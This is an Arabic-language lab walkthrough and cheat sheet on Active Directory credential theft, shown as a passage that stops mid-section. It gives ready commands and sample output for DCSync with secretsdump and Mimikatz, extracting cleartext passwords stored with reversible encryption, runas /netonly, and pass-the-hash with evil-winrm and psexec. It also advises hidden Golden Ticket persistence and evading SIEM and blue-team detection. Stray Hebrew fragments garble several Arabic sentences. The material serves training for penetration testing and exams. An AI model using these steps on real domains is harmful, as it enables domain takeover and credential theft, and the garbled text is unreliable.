🔑 Golden Tips (نصيحة ذهبية):

"الـ DCSync هو الـ Endgame (نهاية اللعبة) بأي فحص AD. إذا نجحت، لا توقف هنا. خذ الـ Hash مال הـ krbtgt وسوي Golden Ticket وخبيها عندك، لأن الـ Blue team أول ما يكتشفوك راح يغيرون باسوورد الـ Administrator، بس نادراً ما يغيرون باسوورد الـ krbtgt مرتين حتى يبطلون التذاكر القديمة. الـ Golden Ticket تضمنلك الـ Persistence (البقاء) لفترات طويلة".

━━━━━

💎 الفلاشكاردز — ملخص سريع للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ماهو هجوم الـ DCSync تقنياً؟

✅ Back: هو محاكاة لسلوك Domain Controller شرعي لطلب مزامنة الـ AD باستخدام بروتوكول MS-DRSR لسحب الـ Hashes.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هي الصلاحيات (Rights) المحددة المطلوبة لتنفيذ DCSync بنجاح؟

✅ Back: صلاحيتين: DS-Replication-Get-Changes و DS-Replication-Get-Changes-All.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: كيف تتحقق من صلاحيات المزامنة ליوزر באמצעות PowerView؟

✅ Back: نستخدم أمر Get-ObjectAcl على الدومين، ونفلتر بـ ObjectAceType لـ Replication-Get وبـ SID اليوزر المخترق.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: الأمر الأساسي لسحب جميع الـ Hashes باستخدام secretsdump.py؟

✅ Back: secretsdump.py -just-dc DOMAIN/user:pass@DC_IP

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: شلون نتجنب الـ Network Traffic العالي إذا ردنا فقط حساب محدد (مثل krbtgt)؟

✅ Back: نستخدم فلاج -just-dc-user krbtgt في أداة secretsdump بدل سحب كل القاعدة.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: الأداة البديلة لـ secretsdump داخل بيئة الويندوز لعمل DCSync؟

✅ Back: أداة Mimikatz باستخدام الأمر: lsadump::dcsync /domain:domain.local /all /csv

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو ملف NTDS.dit ولماذا הוא חשוב بالـ DCSync؟

✅ Back: هو قاعدة بيانات الدليل النشط الموجودة بالـ DC والتي تحتوي على كل الـ NTLM Hashes و Kerberos Keys للشركة بأكملها.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #8

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هي خطوتك التالية بعد الحصول على Hash הـ Administrator بالـ DCSync؟

✅ Back: تنفيذ هجوم Pass-the-Hash (PTH) للاتصال المباشر عبر أدوات مثل evil-winrm أو psexec بدون الحاجة لفك التشفير (Cracking).

━━━━━

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (DCSync & AD Credential Access Cheat Sheet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية الهجوم لـ DCSync:

١. الوصول لـ Foothold بيوزر عادي أو مسيطر عليه.

٢. فحص وتحديد الـ SID لليوزر المخترق (Get-DomainUser).

٣. فحص الـ ACLs لجذر الدومين للبحث عن حقوق الـ Replication (Get-ObjectAcl).

٤. إذا كانت الصلاحيات موجودة، نفذ الهجوم إما من لينكس (secretsdump) أو ويندوز (Mimikatz).

٥. استخرج الـ Hashes المهمة (Admin, krbtgt) ونفذ Pass-the-Hash أو Golden Ticket.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر الأساسية:

|**المجال**|**الهدف**|**الأمر (داخل بيئة أو شيل)**|
|---|---|---|
|AD Enum|معرفة الـ SID لليوزر|`Get-DomainUser -Identity USERNAME|
|AD Enum|فحص حقوق الـ Replication|`Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs|
|DCSync|استخراج كل הـ Hashes من لينكس|`secretsdump.py -just-dc DOMAIN/USER@DC_IP`|
|DCSync|استخراج Hash ליوزر محدد (لينكس)|`secretsdump.py -just-dc-user krbtgt DOMAIN/USER@DC_IP`|
|DCSync|حفظ النتائج بملفات نظيفة|`secretsdump.py -outputfile hashes_out -just-dc DOMAIN/USER@DC_IP`|
|DCSync|فحص حالة الحسابات وسحب الـ NTLM فقط|`secretsdump.py -just-dc-ntlm -user-status DOMAIN/USER@DC_IP`|
|DCSync|تنفيذ DCSync من ويندوز|`mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv" "exit"`|
|DCSync|DCSync ליوزر محدد מן ويندوز|`mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"`|
|Post-Ex|Pass-the-Hash كأدمن من لينكس|`evil-winrm -i DC_IP -u Administrator -H ADMIN_NTLM_HASH`|
|Post-Ex|Pass-the-Hash (Psexec)|`psexec.py DOMAIN/Administrator@DC_IP -hashes :ADMIN_NTLM_HASH`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚨 الفخوخ (لا تنساها بالـ DCSync):

❌ تنفيذ DCSync دون فحص الـ ACLs أولاً → راح يفشل ويترك Event 4662 بـ SIEM الشركة.

❌ استخدام -just-dc بشبكة ضخمة (50K+ يوزر) بالنهار → راح يسبب بطء شبكة وينتبه الـ Blue Team (يفضل استخدام -just-dc-user لليوزر المستهدف فقط).

❌ نسيان كتابة DOMAIN/ قبل اسم اليوزر في secretsdump → الأداة راح تسحب SAM المحلي بدل الـ AD.

❌ الاعتقاد بأن DCSync يحتاج Local Admin على الـ DC → خطأ! هو استغلال لبروتوكول شبكة عن بعد.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هجوم الـ DCSync موجود أصلاً وشلون يشتغل كبروتوكول شرعي)

✅ كل المصطلحات (DCSync, AD, NTDS.dit, krbtgt, ACL, SID)

✅ كيفية التفكير (decision tree لكيفية الصعود بالصلاحيات داخل الـ AD)

✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر من PowerView إلى Impacket)

✅ الـ bypasses والـ variations والفخوخ (DCSync عبر Mimikatz واستخراج יوزر واحد)

✅ فلاشكاردز (للمراجعة السريعة قبل مقابلات العمل أو الامتحانات)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي AD — وراح تجد أن تقييم وفهم الـ ACLs هو مفتاح السيطرة على المملكة. بالتوفيق! 💪





تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture

مرحباً بك مرة ثانية بعالم الـ Active Directory. بالتحدي السابق، نجحنا بتنفيذ هجوم הـ DCSync وسحبنا كل الـ Hashes من قاعدة بيانات الشركة. لكن بهذا الجزء، راح نكتشف مفاجأة خطيرة جداً طلعتنا من بين الملفات اللي سحبناها، وراح نتعلم شلون ننفذ نفس الهجوم (DCSync) بس هالمرة من داخل بيئة Windows مو من Linux.

حتى تفهم الصورة الكبيرة، تخيل وياي شلون الويندوز يخزن كلمات المرور.

بأي نظام تشغيل محترم، كلمة المرور مالتك (مثلاً: Password123) مستحيل تتخزن كنص صريح (Cleartext). النظام ياخذ الكلمة، يمررها بخوارزمية تشفير باتجاه واحد (One-way Hash function)، ويخزن الناتج اللي يكون عبارة عن حروف وأرقام مخربطة (NTLM Hash). الفكرة من "الاتجاه الواحد" إنك إذا شفت الـ Hash، مستحيل رياضياً ترجعه لكلمة المرور الأصلية إلا إذا سويت هجوم تخمين (Brute-force) وجربت كل الكلمات الممكنة لحد ما يطلعلك نفس الـ Hash.

لكن، بالماضي، كانت اكو بروتوكولات وتطبيقات قديمة بالشبكات (مثل بروتوكولات المصادقة Radius، أو CHAP، أو بعض إعدادات الـ IIS القديمة) ما تقبل تتعامل ويه الـ Hash. هاي التطبيقات الغبية جانت تگول للـ Active Directory: "أني ما أفهم الـ NTLM مالتك، أريد كلمة مرور الموظف الحقيقية (النص الصريح) حتى أطابقها يمي".

مايكروسوفت حتى تحل هاي المشكلة وتدعم هاي التطبيقات، ضافت خيار غريب وخطير جداً بالـ Active Directory اسمه (Store password using reversible encryption) أو "تخزين كلمة المرور باستخدام تشفير قابل للعكس".

شنو الخلل الجوهري هنا؟

لما مدير النظام يفعل هذا الخيار ليوزر معين، الـ Active Directory ما راح يخزن الباسورد كـ Hash باتجاه واحد! بدلاً من ذلك، راح ياخذ النص الصريح ويشفره بخوارزمية قديمة اسمها (RC4)، ويخزن مفتاح فك التشفير (اللي هو الـ Syskey) بداخل النظام نفسه.

يعني بالضبط كأنك خازن فلوسك بصندوق مقفول، بس مخلي المفتاح ملزوك على ظهر الصندوق!

لما إحنا كـ Hackers ننفذ هجوم DCSync، ونسحب قاعدة بيانات الـ NTDS.dit، الأداة مالتنا (مثل secretsdump) راح تلگه هاي الباسوردات المشفرة، وتلگه المفتاح، وتفك تشفيرها بثانية وحدة، وتعرضلنا الباسورد الحقيقي (Cleartext) بدون ما نحتاج نفتح Hashcat ولا نضيع ثانية وحدة بالـ Cracking! هذا كنز حقيقي.

بالجزء الثاني من هذا التحدي، راح ننتقل من جهاز الـ Linux اللي كنا نشتغل عليه، ونروح لجهاز Windows مخترق (MS01). ليش؟ لأن بالواقع، أنت كـ Red Teamer مو دائماً تكدر تدخل أجهزتك (Linux) للشبكة الداخلية للعميل. غالباً راح تضطر تستخدم أجهزة الموظفين نفسهم (Windows) لتنفيذ هجماتك. هذا الأسلوب نسميه (Living off the Land). راح نتعلم شلون نستخدم أداة Mimikatz الأسطورية من داخل الويندوز حتى نسوي DCSync، وشلون نخدع الويندوز حتى يخلينا نشتغل بصلاحيات يوزر ثاني (adunn) عبر الشبكة باستخدام أمر `runas /netonly`.

شنو راح نتعلم بنهاية هذا الشرح؟

١. فهم وتحليل ميزة التشفير القابل للعكس وكيفية اكتشافها بالشبكة.

٢. استخدام أدوات الويندوز (PowerShell و PowerView) للبحث عن الحسابات الضعيفة.

٣. تنفيذ هجوم DCSync بالكامل من داخل بيئة Windows باستخدام Mimikatz.

━━━━━

🔵 المرحلة 1: المصطلحات

قبل ما نكتب الأوامر، خلنا نترجم ونفهم كل مصطلح تقني انذكر بالسيناريو. هاي المصطلحات هي لغتك كـ Penetration Tester:

Reversible Encryption (التشفير القابل للعكس)

- شنو يعني؟ ميزة بالـ Active Directory تخلي النظام يحفظ كلمة المرور بشكل مشفر (RC4) مع الاحتفاظ بمفتاح فك التشفير، بدل ما يحفظها كـ Hash باتجاه واحد. إذا قدر المهاجم يسحب قاعدة البيانات، يقدر يرجع الكلمة لأصلها فوراً.
    
- وين يظهر بالأدوات؟ يظهر كخاصية بإعدادات اليوزر، أو كملف `.cleartext` بنتائج أدوات الاستخراج.
    

Cleartext Password (كلمة المرور بالنص الصريح)

- شنو يعني؟ كلمة المرور بشكلها الحقيقي اللي يكتبه اليوزر بالكيبورد (مثلاً: Admin@123) بدون أي تشفير أو Hashing. حصولك عليها يعني إنك تجاوزت الحاجة لكسرها.
    

userAccountControl / UAC (التحكم بحساب المستخدم)

- شنو يعني؟ رقم (Attribute) موجود بخصائص كل يوزر بالـ AD. هذا الرقم هو عبارة عن "مجموع" لقيم صغيرة (Bitmask). كل قيمة تمثل ميزة. مثلاً: حساب معطل، باسورد ما ينتهي، الخ. القيمة اللي تهمنا اليوم هي `128` واللي تعني إن ميزة التشفير القابل للعكس مفعلة `ENCRYPTED_TEXT_PWD_ALLOWED`.
    

Bitwise AND / -band (العملية المنطقية AND)

- شنو يعني؟ طريقة برمجية للبحث داخل رقم הـ userAccountControl. بما أن الرقم هو مجموع لعدة ميزات، نستخدم عملية `band 128-` بالـ PowerShell حتى نسأل: "هل هذا الرقم يتضمن القيمة 128 بداخله؟".
    

Get-ADUser

- شنو يعني؟ أمر مدمج بـ PowerShell (جزء من حزمة RSAT) يستخدم للتواصل مع الـ Domain Controller والاستعلام عن المستخدمين وخصائصهم. أداة شرعية نستخدمها كـ Hackers لجمع المعلومات (Recon).
    

runas.exe

- شنو يعني؟ أداة مدمجة بكل أنظمة ويندوز، تسمحلك بتشغيل برنامج (مثل موجه الأوامر cmd) بصلاحيات مستخدم آخر، بشرط أن تمتلك كلمة المرور مالته. يشبه أمر `sudo` باللينكس تقريباً.
    

/netonly (مفتاح الشبكة فقط)

- شنو يعني؟ هذا Flag سحري نستخدمه مع `runas`. يخلي البرنامج يشتغل على جهازك بصلاحياتك العادية (محلياً)، لكن أي طلب يطلع من هذا البرنامج للشبكة (للـ Domain)، راح يطلع باسم وصلاحيات اليوزر اللي حددته! مفيد جداً لما تريد تهاجم السيرفرات بدون ما تغير هويتك المحلية.
    

Mimikatz

- شنو يعني؟ سكين الجيش السويسري لاختراق الويندوز. أداة برمجها (Benjamin Delpy)، قادرة على استخراج الباسوردات من الذاكرة (LSASS)، تزوير التذاكر (Golden/Silver Tickets)، وتنفيذ هجمات ضخمة مثل DCSync.
    
- الأداة مرعبة لدرجة إن كل برامج الحماية (Antivirus) تصيدها فوراً بالوضع الطبيعي.
    

lsadump::dcsync

- شنو يعني؟ الموديول (القسم) داخل أداة Mimikatz المسؤول عن تنفيذ هجوم الـ DCSync. يتصل بالـ DC ويطلب منه مزامنة وسحب الـ Hashes.
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

📖 ترجمة التحدي:

السيناريو مقسوم إلى جزئين:

الجزء الأول (Linux): بعد ما سحبنا الـ Hashes بأداة `secretsdump.py`، لاحظنا وجود ملف غريب يحتوي على كلمات مرور بنص صريح (Cleartext). التحدي يطلب منا نفهم ليش هذا الملف موجود، وشلون نكتشف أي يوزر بالشبكة يمتلك هاي الثغرة (Reversible Encryption) باستخدام أدوات الويندوز (PowerShell و PowerView).

الجزء الثاني (Windows): نترك جهاز اللينكس، وندخل على جهاز ويندوز مخترق (MS01). من هذا الجهاز، لازم نستخدم اليوزر مالتنا اللي عنده صلاحيات `adunn`، حتى نفتح موجه أوامر يمتلك صلاحياته الشبكية، وبعدين نشغل أداة `Mimikatz` لاستخراج الـ Hash الخاص بالـ Administrator عبر هجوم DCSync مباشرة من بيئة الويندوز.

🎯 معطيات السيناريو:

- الدومين: `INLANEFREIGHT.LOCAL`
    
- اليوزر اللي نملك باسوره وعنده صلاحية المزامنة: `adunn`
    
- اليوزر اللي عنده ثغرة النص الصريح: `proxyagent`
    
- جهاز الهجوم المحلي: MS01 (Windows Attack Host).
    

🧭 كيف تفكر؟ — Decision Tree لهجمات الـ Active Directory المتقدمة:

بمجرد ما تسحب بيانات הـ NTDS وتلگه Cleartext، لازم تفكر كالتالي:

├── اكتشاف النص الصريح (Cleartext Found!)

│ ├── هل هذا خطأ بالأداة؟ ← لا، الأداة دقيقة.

│ └── هل توجد ميزة Reversible Encryption مفعلة؟ ← نعم.

│

├── مرحلة التعداد (Enumeration) للبحث عن الضحايا:

│ └── كيف أجد كل الحسابات المصابة؟

│ ├── عندي RSAT (Active Directory module)؟ ← أستخدم `Get-ADUser -Filter 'userAccountControl -band 128'`

│ └── ما عندي إضافات رسمية؟ ← أستخدم PowerView وأمر `Get-DomainUser`.

│

└── مرحلة التنفيذ (Pivoting to Windows for DCSync):

└── أريد أسوي DCSync بس أنا على جهاز ويندوز لا يمتلك الصلاحية، لكن عندي باسوورد اليوزر `adunn` اللي يمتلكها!

├── هل أسجل خروج (Logoff) وأسجل دخول بـ adunn؟ ← لا، هذا يترك Logs وممكن ينبه الحماية.

└── الحل الذكي: أستخدم `runas /netonly` لفتح PowerShell وهمي يكلم الشبكة باسم `adunn`.

└── بداخل هذا الـ PowerShell → أشغل `Mimikatz` → أنفذ `lsadump::dcsync`.

🗺️ خريطة الهجوم (Roadmap):

١. قراءة مخرجات `secretsdump` وفهم الملفات اللي طلعت.

٢. التحقق من المستخدمين المصابين بثغرة التشفير العكسي باستخدام PowerShell الرسمي.

٣. التحقق باستخدام PowerView (كبديل في حال عدم وجود أدوات رسمية).

٤. قراءة الباسورد الصريح لليوزر `proxyagent`.

٥. التحضير لهجوم الويندوز: فتح PowerShell بصلاحيات شبكية لـ adunn.

٦. تشغيل Mimikatz وتنفيذ استخراج بيانات الـ Administrator.

يله ننتقل للاستغلال الفعلي ونكتب الأوامر!

━━━━━

🟠 المرحلة 3: الاستغلال التفصيلي

راح نمشي خطوة خطوة، وكل أمر راح نشرح ليش استخدمناه وشنو نتيجته.

الخطوة [1]: استعراض مخرجات عملية הـ DCSync السابقة

📌 ليش نسوي هاي الخطوة؟

بناءً على التحدي، إحنا شغلنا أداة `secretsdump.py` بالجزء السابق وحفظنا النتائج بملفات. هسه نريد نشوف شنو الملفات اللي نتجت عن هاي العملية حتى نعرف شنو نملك.

🔧 الأمر:

Code snippet

```
ls inlanefreight_hashes*
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `ls`: أمر اللينكس الشهير لعرض محتويات المجلد.
    
- `inlanefreight_hashes*`: النجمة (`*`) هي Wildcard تعني "اعرضلي أي ملف يبدأ بهذا الاسم بغض النظر عن نهايته".
    

📤 الـ Output المتوقع:

Code snippet

```
inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

✅ الخطوة التالية:

نشوف إن الأداة قسمت الصيد إلى 3 ملفات:

- `.ntds`: هذا الملف يحتوي على الـ NTLM Hashes العادية لكل اليوزرات.
    
- `.kerberos`: يحتوي على مفاتيح الكيربروس.
    
- `.cleartext`: هذا هو الكنز! وجود هذا الملف يعني إن الأداة لگت يوزرات مفعلين ميزة (Reversible Encryption) وسحبت باسورداتهم كنص صريح.
    

━━━━━━━━━━━━━━

الخطوة [2]: التعداد باستخدام Get-ADUser لاكتشاف الحسابات الضعيفة

📌 ليش نسوي هاي الخطوة؟ هسه إحنا كـ Penetration Testers نريد نقدم تقرير للعميل نكوله: "ترى عندك يوزرات إعداداتهم كارثية". فنحتاج أمر يجيب كل اليوزرات اللي مفعلين ميزة التشفير القابل للعكس. بالـ Active Directory GUI، هاي الميزة تظهر كمربع اختيار (Checkbox) بخصائص اليوزر. برمجياً، هاي الميزة قيمتها 128 داخل متغير اسمه `userAccountControl`.

🔧 الأمر:

PowerShell

```
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `Get-ADUser`: أمر الباورشيل الرسمي لجلب معلومات المستخدمين من الـ AD.
    
- `-Filter`: نكوله لا تجيب كل اليوزرات، أريد بس اللي يطابقون شرط معين.
    
- `'userAccountControl -band 128'`: هذا هو السحر! الـ `band-` تعني (Bitwise AND). الرقم مال UAC هو مجموع ميزات (مثلاً 512 يعني حساب عادي، 128 يعني تشفير عكسي. المجموع 640). فإحنا نكوله: افحص كل يوزر، وإذا كان الرقم مالته يتضمن الـ 128 بداخله، اعرضه إلي.
    
- `-Properties userAccountControl`: افتراضياً الأمر ما يعرض عمود الـ UAC، فهنا نجبره يعرضه حتى نتأكد.
    

📤 الـ Output المتوقع:

PowerShell

```
DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :
```

✅ الخطوة التالية:

النتيجة طلعتلنا يوزر اسمه `proxyagent`. ولاحظ رقم הـ UAC مالته هو `640`. (الـ 640 جاي من 512 لحساب طبيعي + 128 لتشفير عكسي = 640). هسه عرفنا منو هو الضحية.

━━━━━━━━━━━━━━

الخطوة [3]: التعداد باستخدام PowerView كبديل

📌 ليش نسوي هاي الخطوة؟

بالواقع، مو دائماً جهاز الويندوز اللي تخترقه يحتوي على أداة `Get-ADUser` لأنها تحتاج تثبيت حزمة RSAT الخاصة بالمدراء. كبديل أقوى وأخفى (Stealthier)، نستخدم أداة PowerView اللي نقدر ننزلها كسكربت ميموري.

🔧 الأمر:

PowerShell

```
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `Get-DomainUser -Identity *`: جيبلي كل اليوزرات بالدومين.
    
- `| ? {...}`: مرر النتائج للفلتر (Where-Object).
    
- `$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'`: PowerView أداة ذكية، تترجم الأرقام (مثل 640) إلى نصوص مفهومة. فنبحث عن النص اللي يدل على التشفير القابل للعكس.
    
- `| select ...`: اعرضلي بس اسم اليوزر وحالته.
    

📤 الـ Output المتوقع:

PowerShell

```
samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

✅ الخطوة التالية:

نفس النتيجة بس بطريقة أسهل للقراءة. أثبتنا إن `proxyagent` هو الهدف.

━━━━━━━━━━━━━━

الخطوة [4]: قراءة الباسورد الصريح (Cleartext)

📌 ليش نسوي هاي الخطوة؟

هسه نرجع للملف اللي أنتجته أداة secretsdump بالخطوة الأولى، ونقرأ محتواه حتى ناخذ باسورد הـ `proxyagent`.

🔧 الأمر:

Code snippet

```
cat inlanefreight_hashes.ntds.cleartext
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `cat`: أمر لعرض محتوى الملف النصي على الشاشة مباشرة.
    

📤 الـ Output المتوقع:

Code snippet

```
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

✅ الخطوة التالية:

بوم! حصلنا الباسورد الحقيقي: `Pr0xy_ILFREIGHT!`. تكدر تاخذ هذا الباسورد وتدخل بيه مباشرة لأي خدمة (RDP, WinRM, Web) بدون ما تضيع ثانية بكسر الـ Hash.

📊 لحد هسة:

[x] حللنا ملفات الـ DCSync السابقة.

[x] اكتشفنا الحسابات المصابة بالـ Reversible Encryption باستخدام طريقتين بالـ PowerShell.

[x] حصلنا باسوورد `proxyagent` الصريح.

[ ] ننفذ DCSync من داخل الويندوز باستخدام Mimikatz ← الخطوات الجاية.

━━━━━━━━━━━━━━

الخطوة [5]: تجهيز بيئة الهجوم بالويندوز باستخدام runas.exe

📌 ليش نسوي هاي الخطوة؟

هسه انتهى شغلنا باللينكس. إحنا حالياً كاعدين على جهاز ويندوز (MS01). نريد نستخدم Mimikatz حتى نسحب الـ Hashes، بس اكو مشكلة: الـ Mimikatz يشتغل بصلاحيات اليوزر الحالي اللي فاتح الجهاز، واليوزر الحالي ما عنده صلاحية DCSync! اليوزر اللي يمتلك الصلاحية هو `adunn` (اللي عرفنا باسوورده سابقاً).

الحل هو نفتح نافذة PowerShell جديدة، ونلبسها "قناع" اليوزر `adunn` باستخدام ميزة الـ `/netonly`.

🔧 الأمر:

DOS

```
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `runas`: أداة لتشغيل البرامج بصلاحيات يوزر آخر.
    
- `/netonly`: أهم خيار! يكول للويندوز: "لا تحاول تسجل دخول هذا اليوزر محلياً على هذا الجهاز (لأن يمكن ما عنده صلاحية Login locally)، بس خذ الباسورد مالته واحتفظ بيه بالذاكرة. وأي طلب يطلع من هاي النافذة باتجاه الشبكة (مثل طلب للـ Domain Controller)، استخدم بيانات adunn".
    
- `/user:INLANEFREIGHT\adunn`: اسم الدومين واسم اليوزر.
    
- `powershell`: البرنامج اللي نريد نفتحه بالنافذة الجديدة.
    

📤 الـ Output المتوقع:

DOS

```
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

(هنا راح تكتب باسوورد adunn وتضغط Enter، وراح تنفتحلك نافذة زرقاء جديدة مال PowerShell).

✅ الخطوة التالية:

بالنافذة الجديدة، أنت شكلياً لا زلت اليوزر القديم، بس فعلياً أي ترافيك شبكة يطلع منك راح يكون باسم `adunn`. هاي الحركة أساسية جداً بهجمات الـ Active Directory (مثل Pass-the-Hash أو Over-Pass-the-Hash).

إليك توضيح (ASCII) للي صار بالخلفية:

```
[ Local Windows Box (MS01) ]
       │
       ├─ Current User (Low Priv)
       │    └─ runas /netonly /user:adunn powershell
       │           │
       │           ▼
       │      [ New PowerShell Window ]
       │      (Local actions = Low Priv User)
       │      (Network actions = adunn!) ───> Contacts DC (172.16.5.5)
       │                                       "Hello, I am adunn"
```

━━━━━━━━━━━━━━

الخطوة [6]: تنفيذ DCSync باستخدام Mimikatz

📌 ليش نسوي هاي الخطوة؟

هسه، بداخل نافذة الـ PowerShell الجديدة (اللي تتواصل ويه الشبكة كـ adunn)، راح نشغل أداة الرعب `mimikatz.exe` ونأمرها تسحب الـ Hash الخاص بأكبر رأس بالشركة: الـ `administrator`.

🔧 الأمر:

PowerShell

```
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `.\mimikatz.exe`: لتشغيل الأداة (لازم تكون منزلها على الجهاز ومتجاوز الـ Antivirus).
    
- `privilege::debug`: هذا أمر سحري بالـ Mimikatz. يطلب من الويندوز إعطاء الأداة صلاحيات عليا (SeDebugPrivilege) اللي تسمح للبرنامج بقراءة ذاكرة برامج أخرى والتعامل ويه خصائص النظام العميقة. بدونها أغلب أوامر ميميكاتز تفشل.
    
- `lsadump::dcsync`: الموديول اللي يحاكي الـ Domain Controller ويطلب المزامنة.
    
- `/domain:INLANEFREIGHT.LOCAL`: نحدد اسم الدومين المستهدف.
    
- `/user:INLANEFREIGHT\administrator`: نكوله أريد الـ Hash مال هذا اليوزر تحديداً (حتى ما نسحب كل قاعدة البيانات ونفضح نفسنا بالشبكة).
    

📤 الـ Output المتوقع:

PowerShell

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **
SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
```

✅ الخطوة التالية:

العملية نجحت بامتياز! Mimikatz اتصل بالـ DC بصلاحيات `adunn`، وسحب الـ NTLM Hash مال الـ `administrator` وهو: `88ad09182de639ccc6579eb0849751cf`.

بهاي اللحظة، الشركة رسمياً سقطت بإيدك. تكدر تستخدم هذا الـ Hash للدخول المباشر (Pass-the-Hash) على أي سيرفر بالشركة والتحكم الكامل.

📐 ملخص الإجابات / النتائج:

|**الخطوة**|**الأداة**|**النتيجة**|
|---|---|---|
|قراءة النتائج|ls + cat|اكتشاف باسوورد proxyagent كنص صريح|
|فحص UAC|Get-ADUser (-band 128)|تأكيد إصابة proxyagent بثغرة Reversible Encryption|
|تجهيز الهوية|runas /netonly|فتح نافذة بصلاحيات شبكية للـ DCSync user|
|تصعيد الصلاحيات|Mimikatz (dcsync)|سحب NTLM Hash للـ Administrator|

━━━━━

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

بالعالم الحقيقي، نادراً ما تمشي الأمور بهذي السلاسة. لازم تكون مستعد للسيناريوهات المختلفة.

🔄 Variations محتملة (ماذا لو):

Variation 1: ماذا لو `Get-ADUser` غير موجودة على جهاز الويندوز؟

